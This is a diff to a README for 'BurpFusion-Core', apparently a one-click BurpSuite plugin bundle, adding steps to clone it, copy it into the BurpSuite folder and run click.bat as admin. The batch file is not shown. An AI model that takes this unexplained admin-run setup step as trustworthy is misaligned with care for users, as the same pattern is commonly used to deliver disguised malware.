@@ -2,11 +2,33 @@
 # ⚡ BurpFusion-Core 
 > **One-Click Install | Zero-Config | Plugins Zero Compilation**  
 
-**Stop wasting hours on setup!** This toolkit delivers a production-ready BurpSuite with hot plugins environment in **under 60s**
+**Stop wasting hours on setup!** This toolkit delivers a production-ready BurpSuite with hot plugins environment in **under 60 seconds**
 -  no compilation, no dependency hell, just pure security test.
+
+### 🚀 Quick Start  
+**One-click setup without dependencies:**  
+
+```bash
+# Download project
+git clone https://github.com/oneclick-burp/BurpFusion-Core.git
+```
+
+**Installation Steps:**  
+1. **Copy** the entire project folder to your BurpSuite installation root
+
+2. **Run** preloader:  Double-click `click.bat` (Run as Admin if needed)  
+
+3. **Launch** BurpSuite normally  
 
 ---
 
+### ✔️ Verification  
+Check successful loading in BurpSuite:  
+1. Go to `Extensions` → `Burp Extensions` tab  
+2. Confirm Loaded plugins
+---
+### 🎥 Demo  
+*Full installation in under 60 seconds*
 ![Demo](docs/demo.gif)
 
 ---
